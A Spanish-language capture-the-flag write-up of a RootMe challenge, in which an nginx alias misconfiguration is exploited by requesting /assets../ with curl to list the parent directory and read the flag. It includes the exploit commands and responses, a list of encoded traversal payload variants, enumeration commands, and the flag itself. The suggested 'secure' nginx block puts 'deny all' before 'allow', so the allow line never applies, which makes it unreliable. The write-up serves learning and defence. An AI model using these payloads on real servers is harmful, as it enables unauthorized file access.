🚩 Write-up: Directory Traversal - RootMe

CTF: RootMe

Categoría: Web

Dificultad: Fácil

Fecha Resuelto: 30 de Diciembre, 2025

Herramientas: curl (Termux en Android)

Flag: RM{4lias_M1sC0nf_HuRtS!}

URL: http://challenge01.root-me.org:59092/

🎯 Descripción del Reto

Una página de login básica que aparentemente no tiene funcionalidad. El código HTML contiene un comentario interesante:

```html
<!--TODO: Patch /assets/ -->
```

Objetivo: Encontrar y acceder a información sensible o archivos no destinados a ser públicos.

🔍 Reconocimiento y Análisis

1. Inspección Inicial

```bash
curl http://challenge01.root-me.org:59092/
```

Respuesta: Página de login estática con formulario HTML. No hay backend funcional aparente.

2. Análisis del Comentario Sospechoso

El comentario <!--TODO: Patch /assets/ --> sugiere:

· Hay un directorio /assets/ que necesita ser "parcheado"
· Posible configuración incorrecta o vulnerabilidad en ese endpoint
· Puede haber exposición de directorios o archivos sensibles

3. Enumeración de Recursos

Primer intento: Acceder directamente a /assets

```bash
curl http://challenge01.root-me.org:59092/assets
```

Respuesta: 301 Moved Permanently - Redirección

Segundo intento: Seguir redirecciones con -L

```bash
curl http://challenge01.root-me.org:59092/assets -L
```

Respuesta: Timeout - Parece haber un bucle de redirección

Tercer intento: Acceder como directorio con /

```bash
curl http://challenge01.root-me.org:59092/assets/ -L
```

Respuesta: Listado de directorio vacío

```html
<h1>Index of /assets/</h1><hr><pre><a href="../">../</a>
</pre>
```

🚀 Explotación (Paso a Paso)

Hipótesis

El comentario TODO: Patch /assets/ combinado con el listado de directorio accesible sugiere una posible misconfiguración de alias en nginx. Podría estar mapeando incorrectamente rutas.

Paso 1: Probar Path Traversal Básico

Intentamos acceder al directorio padre usando ../:

```bash
curl -i http://challenge01.root-me.org:59092/assets../
```

¡Éxito! Respuesta:

```html
<h1>Index of /assets../</h1>
<pre>
<a href="../">../</a>
<a href="assets/">assets/</a>
<a href="static/">static/</a>
<a href="flag.txt">flag.txt</a>
</pre>
```

Paso 2: Acceder al Archivo Sensible

Ahora podemos acceder directamente a flag.txt:

```bash
curl -i http://challenge01.root-me.org:59092/assets../flag.txt
```

Resultado: ¡Flag encontrada!

```
HTTP/1.1 200 OK
Content-Type: text/plain

RM{4lias_M1sC0nf_HuRtS!}
```

🧠 Explicación Técnica

Vulnerabilidad: Path Traversal mediante Misconfiguración de Alias en Nginx

Configuración Defectuosa Probable:

```nginx
location /assets {
    alias /path/to/assets/directory/;
}
```

Problema: Cuando nginx procesa location /assets con alias, y se accede a /assets../, interpreta la ruta como:

· alias + ../ = /path/to/assets/directory/../ = /path/to/
· Esto permite escapar del directorio destinado

¿Por qué funciona assets../ y no assets/../?

· assets/../ sería normalizado por nginx a / (directorio raíz)
· assets../ (sin slash) no es normalizado automáticamente y pasa a la regla del alias

Conceptos Clave Aprendidos

1. Directory Traversal: Acceder a directorios fuera del directorio web destinado
2. Nginx Alias Misconfiguration: Configuraciones incorrectas de alias que permiten path traversal
3. Security through Obscurity is not Security: Comentarios en código pueden revelar información sensible
4. Information Disclosure: Listados de directorio habilitados accidentalmente

📚 Herramientas y Comandos

· curl: Cliente HTTP para testing
· -L: Seguir redirecciones automáticamente
· -i: Mostrar cabeceras HTTP en la respuesta
· Enumeración manual: Prueba de diferentes patrones de path traversal

🔐 Mecanismo de Defensa

Configuración Correcta en Nginx

```nginx
# FORMA SEGURA
location /assets/ {
    alias /path/to/assets/directory/;
    
    # Restricciones adicionales
    deny all;
    allow 127.0.0.1;
    
    # O mejor, servir archivos estáticos de forma segura
    try_files $uri =404;
}

# EVITAR (vulnerable)
location /assets {
    alias /path/to/assets/directory/;
}
```

Buenas Prácticas

1. Validar entradas de ruta: Sanitizar ../ y caracteres especiales
2. Deshabilitar listado de directorios: autoindex off;
3. Usar root en lugar de alias cuando sea posible
4. Monitorear logs para detectar intentos de path traversal
5. Eliminar comentarios en producción

💡 Técnicas de Explotación Alternativas

Otros patrones de Path Traversal

```bash
# Diferentes codificaciones
/assets../
/assets..\
/assets%2e%2e%2f
/assets.%2e/

# Con encoding doble
/assets%252e%252e%252f

# Con punto y coma
/assets..;/
```

Herramientas Automatizadas

```bash
# Dirb (si estuviera disponible en Termux)
dirb http://challenge01.root-me.org:59092/

# Gobuster
gobuster dir -u http://challenge01.root-me.org:59092/ -w /usr/share/wordlists/dirb/common.txt
```

🏁 Flag

RM{4lias_M1sC0nf_HuRtS!}

📝 Notas para Termux/Android

· curl es suficiente para pruebas básicas de path traversal
· La paciencia y prueba manual de diferentes patrones es clave
· Los retos de misconfiguración de servidor son ideales para móvil ya que no requieren herramientas complejas

---

Write-up realizado completamente desde Termux en Android
